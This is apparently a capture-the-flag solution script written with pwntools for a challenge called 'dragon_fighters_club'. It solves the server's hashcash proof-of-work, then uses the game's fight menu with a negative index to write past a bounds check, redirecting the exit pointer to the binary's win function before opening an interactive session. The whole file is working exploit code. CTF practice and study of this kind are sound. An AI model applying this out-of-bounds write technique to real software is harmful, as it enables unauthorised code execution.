from pwn import *

exe = ELF("./dragon_fighters_club")

context.binary = exe

HOST = "dragonfightersclub.challs.olicyber.it"
PORT = 38303

gdbscript = """
set follow-fork-mode child
"""

# args.LOCAL = True
args.DEBUG = True

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r, gdbscript=gdbscript)
    else:
        r = remote(HOST, PORT)

    return r

EXIT = 0x4010b0

def run_hashcash(bits, resource):
    command = ["hashcash", f"-mCb{bits}", resource, "-P"]
    result = subprocess.run(command, check=True, capture_output=True, text=True)
        
    return result.stdout.strip()

def start(r):
    if not args.LOCAL:
        for i in range(3):
            r.recvline()
            
        regex = r'hashcash -mCb(\d+) "(\w+)"'
        bits, resource = re.match(regex, r.recvline().decode()).groups()
        r.recvuntil(b": ")
        r.sendline(run_hashcash(int(bits), resource).encode())
        print("Challenge connection initialized")
        
def fight(r, i, damage):
    r.sendlineafter(b"> ", b"3");
    r.sendlineafter(b"> ", f"{i}".encode())
    res = r.recvline()

    if b"die?" in res:
        print(f"Cant fight {i} :(")
        return

    r.sendline(f"{damage}".encode())
    
def main():
    r = conn()
    start(r)
    
    EXIT_OFFSET = -5

    for i in range(8):
        fight(r, i, 100)

    for _ in range(75):
        fight(r, 8, 1)

    fight(r, EXIT_OFFSET, EXIT - exe.symbols.win)

    r.sendlineafter(b"> ", b"5")
    r.interactive()

if __name__ == "__main__":
    main()
